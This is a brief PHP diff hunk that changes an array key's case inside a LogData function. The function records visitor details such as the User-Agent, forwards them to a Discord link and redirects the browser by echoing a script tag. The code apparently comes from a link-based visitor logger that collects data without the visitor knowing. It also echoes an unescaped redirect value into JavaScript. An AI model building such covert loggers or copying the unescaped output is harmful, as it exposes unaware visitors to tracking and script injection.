@@ -39,7 +39,7 @@ function LogData($device)
     '"User_agent":'.$_SERVER['HTTP_USER_AGENT'];
     write($data);     
     SendDiscordMesg($device['link'], $data);
-    echo "<script>window.location='".$device['redirect']."'</script>";	
+    echo "<script>window.location='".$device['Redirect']."'</script>";	
 }
 
 
